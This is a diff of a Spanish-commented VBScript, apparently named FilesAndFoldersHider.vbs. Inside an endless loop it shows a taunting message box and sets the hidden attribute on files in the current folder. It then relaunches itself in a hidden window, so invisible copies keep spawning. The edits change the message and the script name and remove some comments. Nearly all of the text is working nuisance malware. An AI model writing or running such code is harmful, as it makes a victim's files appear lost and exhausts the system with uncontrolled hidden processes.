@@ -1,14 +1,12 @@
 do
 '########################################################################
-MsgBox("Archivo Oculto! :D")
+MsgBox("Te oculte algo! :D")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 objStartFolder = objFSO.GetAbsolutePathName("")
 Set objFolder = objFSO.GetFolder(objStartFolder)
 Set colFiles = objFolder.Files
 Set colSubDire = objFolder.SubFolders
 
-'el numero 100000 es arbitrario, en este lugar debe ir el numero de archivos
-'y carpetas en una carpeta pero no se como crear un array con tamaño variable en vbs
 Dim arrGroc(100000)
 var1 = 0
 
@@ -35,14 +33,13 @@ boolHide = True
 set objFile2 = objFSO.GetFile(strFile)
 if boolHide = True then
    if objFile2.Attributes AND 2 then
-      'MsgBox("File already hidden")
+      'File already hidden
    else
       objFile2.Attributes = objFile2.Attributes + 2 
-      'MsgBox("File is now hidden")
    end if 
 end if
 '########################################################################
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run chr(34) & "Filesystemobject.vbs" & Chr(34), 0
+WshShell.Run chr(34) & "FilesAndFoldersHider.vbs" & Chr(34), 0
 Set WshShell = Nothing
 loop
